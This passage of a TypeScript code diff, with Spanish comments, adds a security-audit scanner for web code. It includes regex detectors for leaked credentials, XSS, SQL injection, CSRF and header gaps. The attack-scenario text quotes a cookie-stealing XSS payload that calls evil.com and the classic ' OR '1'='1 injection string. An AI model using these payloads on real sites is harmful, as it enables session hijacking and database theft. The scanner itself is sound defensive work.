@@ -3242,4 +3242,555 @@ function buildSecretsReportHtml(
   return scanReportShell(`🕵️ Escaneo de Secretos`, sourceUrl || "Código / HTML pegado", summary.riskScore, body);
 }
 
+// ═══════════════════════════════════════════════════════════════
+// AUDITORÍA DE SEGURIDAD COMPLETA — 8 categorías, escenarios de ataque
+// POST /api/web-lab/security-audit  { url?, html?, projectId? }
+// ═══════════════════════════════════════════════════════════════
+
+type AuditSeverity = "critical" | "high" | "medium" | "low" | "info";
+
+interface AuditFinding {
+  id: string;
+  category: string;
+  type: string;
+  severity: AuditSeverity;
+  title: string;
+  description: string;
+  evidence: string;       // extracto enmascarado del código
+  lineNumber?: number;
+  attackScenario: string; // "Qué haría un hacker con esto"
+  dbImpact?: string;      // impacto en BD si procede
+  fix: string;
+  fixCode?: string;       // snippet de corrección
+  cvss?: number;          // puntuación CVSS aproximada
+}
+
+function findLineNumber(content: string, index: number): number {
+  let line = 1;
+  for (let i = 0; i < index && i < content.length; i++) {
+    if (content[i] === "\n") line++;
+  }
+  return line;
+}
+
+function maskEvidence(raw: string, maxLen = 60): string {
+  if (raw.length <= maxLen) return raw;
+  const mid = raw.slice(0, 6) + "••••••" + raw.slice(-6);
+  return mid.length < raw.length ? mid : raw.slice(0, maxLen) + "…";
+}
+
+function runFullSecurityAudit(content: string, url?: string): AuditFinding[] {
+  const findings: AuditFinding[] = [];
+  const seen = new Set<string>();
+
+  function add(f: AuditFinding) {
+    const dedup = `${f.category}:${f.type}:${f.evidence.slice(0, 20)}`;
+    if (seen.has(dedup)) return;
+    seen.add(dedup);
+    findings.push(f);
+  }
+
+  const lines = content.split("\n");
+  function ctx(idx: number, len = 80): string {
+    const s = Math.max(0, idx - 30);
+    const e = Math.min(content.length, idx + len + 30);
+    return content.slice(s, e).replace(/\n/g, " ").trim();
+  }
+  function lineOf(idx: number): number { return findLineNumber(content, idx); }
+
+  // ─── CATEGORÍA 1: SECRETOS / CREDENCIALES HARDCODEADAS ─────────────────────
+  const SECRET_PATTERNS: Array<{ re: RegExp; type: string; service: string; sev: AuditSeverity; cvss: number; fix: string; fixCode?: string }> = [
+    { re: /sk_live_[0-9a-zA-Z]{24,}/g, type: "API Key Live", service: "Stripe", sev: "critical", cvss: 9.8, fix: "Revocar en dashboard.stripe.com → Developers → API Keys. Usar variable de entorno STRIPE_SECRET_KEY en servidor.", fixCode: "// .env\nSTRIPE_SECRET_KEY=sk_live_...\n// código\nconst stripe = new Stripe(process.env.STRIPE_SECRET_KEY);" },
+    { re: /sk_test_[0-9a-zA-Z]{24,}/g, type: "API Key Test", service: "Stripe", sev: "high", cvss: 7.5, fix: "Mover a variable de entorno del servidor. Las test keys también permiten leer datos." },
+    { re: /pk_live_[0-9a-zA-Z]{24,}/g, type: "Publishable Key Live", service: "Stripe", sev: "high", cvss: 6.5, fix: "La pk_ live puede ser pública, pero nunca exponer junto a sk_. Restringir a dominios en Stripe Dashboard." },
+    { re: /sk-[A-Za-z0-9]{20,}T3BlbkFJ[A-Za-z0-9]{20,}|sk-proj-[A-Za-z0-9_-]{50,}/g, type: "API Key", service: "OpenAI", sev: "critical", cvss: 9.8, fix: "Revocar en platform.openai.com → API Keys. Crear nueva. Usar solo en backend con OPENAI_API_KEY.", fixCode: "// .env\nOPENAI_API_KEY=sk-proj-...\n// servidor\nconst openai = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });" },
+    { re: /sk-ant-api\d{2}-[A-Za-z0-9_-]{80,}/g, type: "API Key", service: "Anthropic", sev: "critical", cvss: 9.8, fix: "Revocar en console.anthropic.com → API Keys. ANTHROPIC_API_KEY solo en servidor." },
+    { re: /AIza[0-9A-Za-z_-]{35}/g, type: "API Key", service: "Google Cloud / Firebase", sev: "critical", cvss: 9.1, fix: "Restringir en Google Cloud Console → APIs → Credentials. Limitar por HTTP Referrer o IP." },
+    { re: /ya29\.[0-9A-Za-z\-_]{50,}/g, type: "OAuth Access Token", service: "Google OAuth", sev: "critical", cvss: 9.8, fix: "Revocar en myaccount.google.com → Security → Manage third-party access." },
+    { re: /AKIA[0-9A-Z]{16}/g, type: "Access Key ID", service: "AWS", sev: "critical", cvss: 9.8, fix: "Revocar en AWS IAM Console inmediatamente. Auditar con CloudTrail. Usar IAM Roles, no claves estáticas." },
+    { re: /ghp_[A-Za-z0-9]{36,}|github_pat_[A-Za-z0-9_]{82,}/g, type: "Personal Access Token", service: "GitHub", sev: "critical", cvss: 9.8, fix: "Revocar en github.com → Settings → Developer settings → PATs. Usar GitHub Actions secrets." },
+    { re: /shppa_[A-Za-z0-9]{32,}|shpat_[A-Za-z0-9]{32,}|shpss_[A-Za-z0-9]{32,}/g, type: "Private App Token", service: "Shopify", sev: "critical", cvss: 9.5, fix: "Revocar en Shopify Admin → Apps → Private apps. Nunca exponer access tokens en frontend." },
+    { re: /SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}/g, type: "API Key", service: "SendGrid", sev: "critical", cvss: 9.1, fix: "Revocar en app.sendgrid.com → Settings → API Keys." },
+    { re: /xox[baprs]-[0-9A-Za-z-]{10,}/g, type: "Bot/User Token", service: "Slack", sev: "critical", cvss: 9.1, fix: "Revocar en api.slack.com → Your Apps → OAuth. Usar Slack App con permisos mínimos." },
+    { re: /[0-9]{8,10}:[A-Za-z0-9_-]{35}/g, type: "Bot Token", service: "Telegram", sev: "critical", cvss: 9.1, fix: "Usar /revoke en @BotFather de Telegram." },
+    { re: /-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/g, type: "Clave privada RSA/PEM/SSH", service: "Criptografía", sev: "critical", cvss: 10.0, fix: "Eliminar del código. Usar gestores de secretos (AWS Secrets Manager, HashiCorp Vault, Replit Secrets)." },
+    { re: /(?:mysql|postgres|postgresql|mongodb|redis|amqp|mssql):\/\/[^:@\s"']+:[^@\s"']{4,}@[^'"\s]{4,}/gi, type: "URL de conexión con credenciales", service: "Base de datos", sev: "critical", cvss: 9.8, fix: "Nunca hardcodear URLs de BD con usuario/contraseña. Usar DATABASE_URL en variables de entorno del servidor." },
+    { re: /(?:password|passwd|secret|client_secret|db_pass|database_password|db_password)\s*[=:]\s*["'][^"']{6,}["']/gi, type: "Contraseña hardcodeada", service: "Genérico", sev: "high", cvss: 8.1, fix: "Mover a variables de entorno. Usar .env + dotenv. Nunca en código fuente ni frontend.", fixCode: "// MAL\nconst password = 'mi_contraseña_123';\n// BIEN\nconst password = process.env.DB_PASSWORD;" },
+    { re: /(?:api[_-]?key|apikey)\s*[=:]\s*["'][A-Za-z0-9_\-]{20,}["']/gi, type: "API Key genérica", service: "Genérico", sev: "high", cvss: 7.5, fix: "Verificar si es clave real. Si lo es, mover a variable de entorno del servidor." },
+    { re: /eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g, type: "JWT Token hardcodeado", service: "Autenticación", sev: "high", cvss: 8.1, fix: "Los JWT nunca deben estar hardcodeados. Pueden revelar la firma del servidor y permisos del usuario." },
+    { re: /AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}/g, type: "Legacy Server Key", service: "Firebase FCM", sev: "critical", cvss: 9.1, fix: "Migrar a FCM v1 con OAuth 2.0. Revocar Legacy Server Key en Firebase Console." },
+  ];
+  for (const p of SECRET_PATTERNS) {
+    for (const m of content.matchAll(new RegExp(p.re.source, p.re.flags.replace(/[^gimsuy]/g, "") + (p.re.flags.includes("g") ? "" : "g")))) {
+      const raw = m[0];
+      const idx = m.index ?? 0;
+      add({
+        id: `secret-${p.service.toLowerCase().replace(/\W/g, "-")}-${findings.length}`,
+        category: "🔑 Secretos & Credenciales",
+        type: p.type,
+        severity: p.sev,
+        title: `${p.service} — ${p.type} expuesto en el código`,
+        description: `Se detectó una credencial real de ${p.service} hardcodeada en el código fuente. Cualquier persona que acceda al bundle/código puede extraerla.`,
+        evidence: maskEvidence(raw),
+        lineNumber: lineOf(idx),
+        attackScenario: p.service === "Stripe"
+          ? `Un atacante con esta clave puede cargar tarjetas de tus clientes, crear cargos, acceder a toda la información de pagos y filtrar datos de clientes de Stripe.`
+          : p.service === "AWS"
+          ? `Con AKIA + Secret Key, el atacante puede lanzar instancias EC2, acceder a S3 (descargar/borrar datos), comprometer toda tu infraestructura en AWS.`
+          : p.service.includes("Base de datos")
+          ? `Con la URL de conexión, el atacante tiene acceso directo a tu base de datos: puede leer, modificar o borrar todos los registros, incluyendo usuarios, pedidos y datos sensibles.`
+          : `El atacante puede usar esta clave para acceder a ${p.service}, escalar privilegios, exfiltrar datos o incurrir en costes masivos en tu cuenta.`,
+        dbImpact: p.service.includes("Base de datos") || p.service === "AWS"
+          ? "RIESGO CRÍTICO DE BD: Acceso completo a los datos. El atacante puede volcar toda la base de datos, modificar registros, crear usuarios administradores o borrar todos los datos (ransomware)."
+          : undefined,
+        fix: p.fix,
+        fixCode: p.fixCode,
+        cvss: p.cvss,
+      });
+    }
+  }
+
+  // ─── CATEGORÍA 2: VECTORES DE ATAQUE XSS ───────────────────────────────────
+  const XSS_PATTERNS: Array<{ re: RegExp; type: string; sev: AuditSeverity; cvss: number; scenario: string; fix: string; fixCode?: string }> = [
+    {
+      re: /\.innerHTML\s*[+]?=\s*[^"'`\n]/,
+      type: "XSS via innerHTML", sev: "critical", cvss: 8.8,
+      scenario: "El atacante inyecta <script>document.cookie</script> o <img onerror=fetch('//evil.com/'+document.cookie)> en cualquier campo de entrada que se muestre con innerHTML. Sin restricciones, roba las sesiones de todos los usuarios.",
+      fix: "Usar textContent en lugar de innerHTML. Si necesitas HTML, usa DOMPurify.sanitize() o innerHTML solo con contenido estático.",
+      fixCode: "// MAL\nel.innerHTML = userInput;\n// BIEN\nel.textContent = userInput;\n// O con DOMPurify\nimport DOMPurify from 'dompurify';\nel.innerHTML = DOMPurify.sanitize(userInput);"
+    },
+    {
+      re: /document\.write\s*\(/g,
+      type: "XSS via document.write", sev: "high", cvss: 8.1,
+      scenario: "document.write() puede escribir HTML arbitrario en el documento. Si el argumento proviene de la URL o input del usuario, permite inyección de scripts maliciosos.",
+      fix: "Eliminar document.write(). Usar DOM APIs modernas: createElement, textContent, appendChild.",
+    },
+    {
+      re: /\beval\s*\([^)]/g,
+      type: "Ejecución de código arbitrario (eval)", sev: "critical", cvss: 9.0,
+      scenario: "eval() ejecuta cualquier string como código JavaScript. Si el contenido proviene de entrada del usuario o de la URL, el atacante puede ejecutar código arbitrario en el contexto del navegador de la víctima.",
+      fix: "Eliminar eval(). Reemplazar con JSON.parse() para datos, o refactorizar la lógica.",
+      fixCode: "// MAL\nconst data = eval(serverResponse);\n// BIEN\nconst data = JSON.parse(serverResponse);"
+    },
+    {
+      re: /new\s+Function\s*\(/g,
+      type: "new Function() — eval encubierto", sev: "high", cvss: 8.5,
+      scenario: "new Function(code) es equivalente a eval(). Si el string proviene de entrada externa, permite ejecución de código arbitrario.",
+      fix: "Eliminar new Function(). Refactorizar usando funciones normales.",
+    },
+    {
+      re: /setTimeout\s*\(\s*["'`][^"'`]/g,
+      type: "setTimeout con string de código", sev: "medium", cvss: 6.1,
+      scenario: "setTimeout('codigo()', delay) ejecuta el string como código. Similar a eval si el string es controlable.",
+      fix: "Usar setTimeout(() => funcion(), delay) con función flecha en lugar de string.",
+    },
+    {
+      re: /dangerouslySetInnerHTML\s*=\s*\{\s*\{[^}]*__html\s*:/g,
+      type: "dangerouslySetInnerHTML en React", sev: "high", cvss: 7.5,
+      scenario: "dangerouslySetInnerHTML sin DOMPurify permite XSS en apps React si el contenido proviene de API o input de usuario.",
+      fix: "Siempre sanitizar con DOMPurify.sanitize() antes de dangerouslySetInnerHTML.",
+      fixCode: "import DOMPurify from 'dompurify';\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(content) }} />"
+    },
+    {
+      re: /location\.href\s*=\s*(?:location\.search|new URL|window\.location|decodeURI|req\.query|request\.query)/g,
+      type: "Open Redirect", sev: "high", cvss: 7.4,
+      scenario: "El atacante envía a la víctima un link como miapp.com/redirect?url=https://phishing.com. El sitio redirige ciegamente y la víctima cree que está en un dominio de confianza.",
+      fix: "Validar que la URL de destino pertenece a dominios permitidos. Usar allowlist de rutas internas.",
+      fixCode: "const ALLOWED = new Set(['/', '/dashboard', '/profile']);\nconst next = searchParams.get('next');\nrouter.push(ALLOWED.has(next) ? next : '/');"
+    },
+  ];
+  for (const p of XSS_PATTERNS) {
+    for (const m of content.matchAll(new RegExp(p.re.source, p.re.flags.replace(/[^gimsuy]/g, "") + (p.re.flags.includes("g") ? "" : "g")))) {
+      const idx = m.index ?? 0;
+      add({
+        id: `xss-${findings.length}`,
+        category: "💉 Inyección & XSS",
+        type: p.type,
+        severity: p.sev,
+        title: p.type,
+        description: `Patrón de código potencialmente vulnerable a inyección detectado. Contexto: \`${ctx(idx, 60)}\``,
+        evidence: maskEvidence(ctx(idx, 60)),
+        lineNumber: lineOf(idx),
+        attackScenario: p.scenario,
+        fix: p.fix,
+        fixCode: p.fixCode,
+        cvss: p.cvss,
+      });
+    }
+  }
+
+  // ─── CATEGORÍA 3: SQL / NoSQL INJECTION ────────────────────────────────────
+  const SQLI_PATTERNS: Array<{ re: RegExp; type: string; sev: AuditSeverity; cvss: number; scenario: string; fix: string; fixCode?: string }> = [
+    {
+      re: /["'`]\s*\+\s*(?:req\.|request\.|params\.|query\.|body\.|userInput|userId|username|email)[A-Za-z_.[\]"']*/g,
+      type: "SQL Injection — concatenación de string", sev: "critical", cvss: 9.8,
+      scenario: "Con input como ' OR '1'='1, el atacante puede bypassear autenticación, extraer toda la BD, o borrar datos con DROP TABLE. Si la BD tiene procedimientos, puede ejecutar comandos del SO.",
+      fix: "Usar prepared statements / queries parametrizadas. NUNCA concatenar input de usuario en SQL.",
+      fixCode: "// MAL\ndb.query(`SELECT * FROM users WHERE id = '${userId}'`);\n// BIEN\ndb.query('SELECT * FROM users WHERE id = $1', [userId]);"
+    },
+    {
+      re: /\$where\s*:\s*(?:req\.|request\.|params\.|query\.|body\.)/g,
+      type: "NoSQL Injection — $where con input de usuario", sev: "critical", cvss: 9.0,
+      scenario: "El operador $where de MongoDB ejecuta JS en el servidor. Con input malicioso, el atacante puede saltarse filtros y acceder a todos los documentos.",
+      fix: "Nunca usar $where con input de usuario. Usar operadores de consulta seguros ($eq, $gt, etc.).",
+    },
+    {
+      re: /db\.query\s*\(`[^`]*\$\{(?!.*\?)/g,
+      type: "SQL con template literal sin parametrizar", sev: "critical", cvss: 9.8,
+      scenario: "Template literals en queries SQL son equivalentes a concatenación. Un atacante puede inyectar SQL arbitrario si alguna variable proviene de input externo.",
+      fix: "Usar queries parametrizadas o un ORM (Prisma, Sequelize, TypeORM) que las maneje automáticamente.",
+    },
+  ];
+  for (const p of SQLI_PATTERNS) {
+    for (const m of content.matchAll(new RegExp(p.re.source, p.re.flags.replace(/[^gimsuy]/g, "") + (p.re.flags.includes("g") ? "" : "g")))) {
+      const idx = m.index ?? 0;
+      add({
+        id: `sqli-${findings.length}`,
+        category: "🗄️ SQL / NoSQL Injection",
+        type: p.type,
+        severity: p.sev,
+        title: p.type,
+        description: `Patrón de inyección SQL/NoSQL detectado. Contexto: \`${ctx(idx, 80)}\``,
+        evidence: maskEvidence(ctx(idx, 80)),
+        lineNumber: lineOf(idx),
+        attackScenario: p.scenario,
+        dbImpact: "IMPACTO EN BD: Extracción completa de datos (DATA EXFILTRATION), modificación de registros, eliminación de tablas, o escalada a administrador de BD.",
+        fix: p.fix,
+        fixCode: p.fixCode,
+        cvss: p.cvss,
+      });
+    }
+  }
+
+  // ─── CATEGORÍA 4: BUGS DE CÓDIGO CRÍTICOS ──────────────────────────────────
+  const CODE_BUG_PATTERNS: Array<{ re: RegExp; type: string; sev: AuditSeverity; cvss: number; scenario: string; fix: string }> = [
+    {
+      re: /\bcatch\s*\([^)]*\)\s*\{\s*\}/g,
+      type: "Error silenciado (catch vacío)", sev: "high", cvss: 7.2,
+      scenario: "Los errores silenciados ocultan fallos de seguridad, bugs de lógica de negocio y fallos de autenticación. Un atacante puede explotar el comportamiento inesperado que el código nunca registra.",
+      fix: "Siempre loguear o propagar errores. Nunca catch() {}.",
+    },
+    {
+      re: /debugger\s*;/g,
+      type: "Sentencia 'debugger' en producción", sev: "medium", cvss: 4.3,
+      scenario: "La sentencia debugger pausa la ejecución en DevTools. En producción revela puntos de interés para el atacante durante su análisis del código.",
+      fix: "Eliminar todas las sentencias 'debugger' antes de desplegar en producción.",
+    },
+    {
+      re: /console\.(log|debug|info|trace|dir|table)\s*\([^)]*(?:password|token|secret|key|auth|credential|jwt|ssn|credit)/gi,
+      type: "Datos sensibles en console.log", sev: "high", cvss: 7.5,
+      scenario: "Los logs del servidor pueden ser accesibles a través de herramientas de monitorización, archivos de log expuestos o errores en la configuración del servidor. Tokens y contraseñas en logs son un vector de ataque frecuente.",
+      fix: "Eliminar console.log con datos sensibles. Usar loggers que redacten automáticamente datos PII.",
+    },
+    {
+      re: /TODO[:!]?\s*(?:fix|remove|hack|temp|temporary|workaround|security|auth)/gi,
+      type: "TODO de seguridad pendiente en código", sev: "medium", cvss: 5.0,
+      scenario: "Los TODOs de seguridad indican que el desarrollador era consciente de una vulnerabilidad pero no la resolvió. Son pistas directas para un atacante que analice el código.",
+      fix: "Resolver los TODOs de seguridad antes de desplegar. Crear tickets de seguimiento.",
+    },
+    {
+      re: /FIXME[:!]?\s*(?:security|auth|injection|xss|csrf|validation)/gi,
+      type: "FIXME de seguridad en código", sev: "high", cvss: 7.0,
+      scenario: "FIXME indica un error conocido. Los relacionados con seguridad son vulnerabilidades confirmadas por el propio equipo de desarrollo.",
+      fix: "Resolver inmediatamente. Un FIXME de seguridad es una vulnerabilidad conocida y no parcheada.",
+    },
+    {
+      re: /Object\.assign\s*\(\s*\{\s*\}\s*,\s*(?:req\.body|request\.body|JSON\.parse)/g,
+      type: "Prototype Pollution potencial", sev: "high", cvss: 7.5,
+      scenario: "Object.assign({}, req.body) con input que contiene __proto__ o constructor.prototype puede contaminar el prototipo de todos los objetos, permitiendo inyectar propiedades arbitrarias globalmente.",
+      fix: "Usar structuredClone() en lugar de Object.assign. O validar/sanitizar req.body con un schema (Zod, Joi) que rechace __proto__.",
+      fixCode: "// MAL\nconst merged = Object.assign({}, req.body);\n// BIEN\nconst schema = z.object({ name: z.string(), email: z.string().email() });\nconst merged = schema.parse(req.body);"
+    },
+    {
+      re: /process\.env\b(?!\.)/g,
+      type: "process.env expuesto en bundl", sev: "high", cvss: 7.8,
+      scenario: "Si process.env se expone en código cliente (Vite import.meta.env, Next.js sin NEXT_PUBLIC_), todas las variables de entorno del servidor pueden filtrarse al bundle del navegador.",
+      fix: "En Vite usar solo VITE_ prefix. En Next.js solo NEXT_PUBLIC_. Nunca referencias process.env genérico en código cliente.",
+    },
+  ];
+  for (const p of CODE_BUG_PATTERNS) {
+    const matches = [...content.matchAll(new RegExp(p.re.source, p.re.flags.replace(/[^gimsuy]/g, "") + (p.re.flags.includes("g") ? "" : "g")))];
+    if (matches.length === 0) continue;
+    const m = matches[0];
+    const idx = m.index ?? 0;
+    add({
+      id: `bug-${findings.length}`,
+      category: "🐛 Bugs & Código Inseguro",
+      type: p.type,
+      severity: p.sev,
+      title: `${p.type} (${matches.length > 1 ? matches.length + " ocurrencias" : "1 ocurrencia"})`,
+      description: `Patrón inseguro detectado ${matches.length} vez/veces. Primera aparición en línea ${lineOf(idx)}.`,
+      evidence: maskEvidence(ctx(idx, 70)),
+      lineNumber: lineOf(idx),
+      attackScenario: p.scenario,
+      fix: p.fix,
+      cvss: p.cvss,
+    });
+  }
+
+  // ─── CATEGORÍA 5: EXPOSICIÓN DE BD / INFRAESTRUCTURA ───────────────────────
+  const INFRA_PATTERNS: Array<{ re: RegExp; type: string; sev: AuditSeverity; cvss: number; scenario: string; dbImpact?: string; fix: string }> = [
+    {
+      re: /(?:mongodb(?:\+srv)?|postgres(?:ql)?|mysql|redis|mssql|mariadb):\/\/[^\s"'`]{10,}/gi,
+      type: "URL de BD expuesta (sin credenciales visibles)", sev: "high", cvss: 8.1,
+      scenario: "La URL de la BD revela el tipo de base de datos, host, puerto y nombre de BD. Con esta info el atacante puede intentar ataques directos al servidor de BD si está expuesto.",
+      dbImpact: "RIESGO BD: El host de la BD queda expuesto. Si el firewall no está bien configurado, el atacante puede conectarse directamente.",
+      fix: "Mover DATABASE_URL a variables de entorno del servidor. Asegurarse de que el servidor de BD NO es accesible desde internet (solo desde la VPC/red privada).",
+    },
+    {
+      re: /(?:192\.168\.|10\.\d+\.\d+\.|172\.(?:1[6-9]|2\d|3[01])\.\d+\.)\d+/g,
+      type: "IP interna expuesta", sev: "medium", cvss: 5.3,
+      scenario: "Las IPs internas revelan la topología de red interna. Un atacante con acceso parcial puede usar esta info para lateral movement (moverse por la red interna).",
+      fix: "No incluir IPs de red interna en código cliente. Usar nombres de servicio (DNS interno) y variables de entorno.",
+    },
+    {
+      re: /localhost:\d{4,5}/g,
+      type: "Referencia a localhost en código de producción", sev: "medium", cvss: 5.0,
+      scenario: "Las referencias a localhost en producción rompen la aplicación y revelan que el entorno de desarrollo y producción no están bien separados. Pueden apuntar a servicios internos.",
+      fix: "Usar variables de entorno para URLs de servicios. NODE_ENV checks para configuraciones diferentes.",
+    },
+    {
+      re: /(?:at\s+\w+\s+\()(?:[A-Za-z]:[/\\]|\/home\/|\/Users\/|\/var\/www\/).+?:\d+:\d+/g,
+      type: "Stack trace / ruta del servidor expuesta", sev: "high", cvss: 7.5,
+      scenario: "Los stack traces revelan la estructura de directorios del servidor, framework, librerías y versiones. El atacante puede buscar vulnerabilidades conocidas en esas versiones específicas.",
+      fix: "En producción, nunca enviar stack traces al cliente. Usar manejadores de error que retornen mensajes genéricos.",
+      fixCode: "// Express error handler\napp.use((err, req, res, next) => {\n  logger.error(err);\n  res.status(500).json({ error: 'Error interno del servidor' }); // no incluir err.stack\n});"
+    },
+    {
+      re: /(?:X-Powered-By|Server):\s*(?:Express|PHP|nginx|Apache|ASP\.NET|Laravel)/gi,
+      type: "Cabecera de versión de servidor expuesta", sev: "medium", cvss: 5.3,
+      scenario: "Revelar Express/PHP/nginx con versión permite al atacante buscar CVEs específicos de esa versión y explotar vulnerabilidades conocidas sin ningún esfuerzo de reconocimiento adicional.",
+      fix: "En Express: app.disable('x-powered-by'). En nginx: server_tokens off. En Apache: ServerTokens Prod.",
+    },
+  ];
+  for (const p of INFRA_PATTERNS) {
+    for (const m of content.matchAll(new RegExp(p.re.source, p.re.flags.replace(/[^gimsuy]/g, "") + (p.re.flags.includes("g") ? "" : "g")))) {
+      const idx = m.index ?? 0;
+      add({
+        id: `infra-${findings.length}`,
+        category: "🏗️ Infraestructura & Datos",
+        type: p.type,
+        severity: p.sev,
+        title: p.type,
+        description: `Información de infraestructura expuesta: \`${maskEvidence(m[0])}\``,
+        evidence: maskEvidence(m[0]),
+        lineNumber: lineOf(idx),
+        attackScenario: p.scenario,
+        dbImpact: p.dbImpact,
+        fix: p.fix,
+        cvss: p.cvss,
+      });
+    }
+  }
+
+  // ─── CATEGORÍA 6: DATOS SENSIBLES EN FRONTEND ───────────────────────────────
+  const SENSITIVE_PATTERNS: Array<{ re: RegExp; type: string; sev: AuditSeverity; cvss: number; scenario: string; fix: string }> = [
+    {
+      re: /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/g,
+      type: "Número de tarjeta de crédito hardcodeado", sev: "critical", cvss: 9.5,
+      scenario: "Un número de tarjeta real en el código permite al atacante cargos fraudulentos inmediatos. Si es de testing, indica que se usan datos reales en entornos de desarrollo.",
+      fix: "Eliminar inmediatamente. Usar datos de prueba ficticios de Stripe/PayPal (4242 4242 4242 4242).",
+    },
+    {
+      re: /\b\d{3}-\d{2}-\d{4}\b/g,
+      type: "Número de Seguro Social (SSN) hardcodeado", sev: "critical", cvss: 9.8,
+      scenario: "Un SSN real en código es una violación grave de privacidad (GDPR, CCPA). Permite robo de identidad y multas de decenas de miles de euros.",
+      fix: "Eliminar inmediatamente. Reportar como violación de datos si estaba en un repositorio compartido.",
+    },
+    {
+      re: /(?:admin|administrator|root)\s*[:=]\s*["'](?!password_placeholder)[^"']{4,}["']/gi,
+      type: "Credenciales de admin hardcodeadas", sev: "critical", cvss: 9.8,
+      scenario: "Credenciales de administrador en código permiten al atacante acceso total al sistema con privilegios máximos. Es el tipo de hallazgo más buscado en un pentest.",
+      fix: "Eliminar inmediatamente. Cambiar contraseña del admin. Revisar logs para accesos no autorizados previos.",
+    },
+  ];
+  for (const p of SENSITIVE_PATTERNS) {
+    for (const m of content.matchAll(new RegExp(p.re.source, p.re.flags.replace(/[^gimsuy]/g, "") + (p.re.flags.includes("g") ? "" : "g")))) {
+      if (m[0].match(/4242424242424242|1234567890123456|test.*card/i)) continue; // skip known test data
+      const idx = m.index ?? 0;
+      add({
+        id: `sensitive-${findings.length}`,
+        category: "🔒 Datos Sensibles",
+        type: p.type,
+        severity: p.sev,
+        title: p.type,
+        description: `Dato sensible detectado en el código fuente.`,
+        evidence: maskEvidence(m[0]),
+        lineNumber: lineOf(idx),
+        attackScenario: p.scenario,
+        fix: p.fix,
+        cvss: p.cvss,
+      });
+    }
+  }
+
+  // ─── CATEGORÍA 7: CSRF & AUTENTICACIÓN ─────────────────────────────────────
+  const CSRF_PATTERNS: Array<{ re: RegExp; type: string; sev: AuditSeverity; cvss: number; scenario: string; fix: string; fixCode?: string }> = [
+    {
+      re: /fetch\s*\([^)]+,\s*\{[^}]*method\s*:\s*["'](POST|PUT|DELETE|PATCH)["'][^}]*\}(?![^)]*headers[^)]*(?:csrf|xsrf|token))/gi,
+      type: "Petición mutante sin cabecera CSRF", sev: "medium", cvss: 6.5,
+      scenario: "Sin tokens CSRF, un atacante puede crear una página web maliciosa que, cuando la visita un usuario autenticado en tu app, realiza peticiones POST/DELETE en su nombre (Cross-Site Request Forgery).",
+      fix: "Añadir token CSRF en todas las peticiones que modifican datos. En Express usar csurf. En Next.js usar headers personalizados.",
+      fixCode: "// Añadir header anti-CSRF\nfetch('/api/orders', {\n  method: 'POST',\n  headers: { 'X-CSRF-Token': getCSRFToken(), 'Content-Type': 'application/json' },\n  body: JSON.stringify(data)\n});"
+    },
+    {
+      re: /cors\s*\(\s*\{\s*origin\s*:\s*(?:true|["']\*["']|\*)/g,
+      type: "CORS demasiado permisivo (origin: *)", sev: "high", cvss: 7.5,
+      scenario: "Con CORS wildcard (*), cualquier sitio web puede hacer peticiones autenticadas a tu API. Combinado con credenciales/cookies, permite ataques CSRF desde cualquier origen.",
+      fix: "Especificar orígenes permitidos explícitamente. Nunca usar * en producción con credentials: true.",
+      fixCode: "// MAL\napp.use(cors({ origin: '*' }));\n// BIEN\napp.use(cors({\n  origin: ['https://mitienda.com', 'https://admin.mitienda.com'],\n  credentials: true\n}));"
+    },
+  ];
+  for (const p of CSRF_PATTERNS) {
+    const matches = [...content.matchAll(new RegExp(p.re.source, p.re.flags.replace(/[^gimsuy]/g, "") + (p.re.flags.includes("g") ? "" : "g")))];
+    if (matches.length === 0) continue;
+    const m = matches[0];
+    const idx = m.index ?? 0;
+    add({
+      id: `csrf-${findings.length}`,
+      category: "🛡️ CSRF & Autenticación",
+      type: p.type,
+      severity: p.sev,
+      title: p.type,
+      description: `Problema de autenticación/CSRF detectado. ${matches.length > 1 ? matches.length + " ocurrencias." : ""}`,
+      evidence: maskEvidence(ctx(idx, 80)),
+      lineNumber: lineOf(idx),
+      attackScenario: p.scenario,
+      fix: p.fix,
+      fixCode: p.fixCode,
+      cvss: p.cvss,
+    });
+  }
+
+  // ─── CATEGORÍA 8: HEADERS DE SEGURIDAD AUSENTES ────────────────────────────
+  if (url) {
+    if (!content.includes("Content-Security-Policy")) {
+      add({ id: "header-csp", category: "🌐 Headers HTTP", type: "Sin Content-Security-Policy", severity: "high", cvss: 7.5, title: "Sin Content-Security-Policy (CSP)", description: "No se detecta CSP en el HTML. Sin CSP, cualquier script inyectado via XSS se ejecuta sin restricciones.", evidence: "CSP header no encontrado", attackScenario: "Sin CSP, un XSS puede exfiltrar cookies, hacer peticiones en nombre del usuario, redirigir a phishing o instalar keyloggers.", fix: "Añadir CSP header en el servidor. Empezar con: Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-xxx';", fixCode: "// Express\napp.use((req, res, next) => {\n  res.setHeader('Content-Security-Policy', \"default-src 'self'; script-src 'self';\");\n  next();\n});" });
+    }
+    if (url.startsWith("https://") && !content.includes("Strict-Transport-Security")) {
+      add({ id: "header-hsts", category: "🌐 Headers HTTP", type: "Sin HSTS", severity: "high", cvss: 7.2, title: "Sin Strict-Transport-Security (HSTS)", description: "Sin HSTS el navegador puede ser engañado para conectar por HTTP, exponiendo cookies y sesiones a interceptación.", evidence: "HSTS header no encontrado", attackScenario: "Ataque SSL Stripping: el atacante en la misma red WiFi puede downgrade la conexión de HTTPS a HTTP y leer/modificar todo el tráfico, incluyendo sesiones y datos de pago.", fix: "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload" });
+    }
+    if (!content.includes("X-Frame-Options") && !content.includes("frame-ancestors")) {
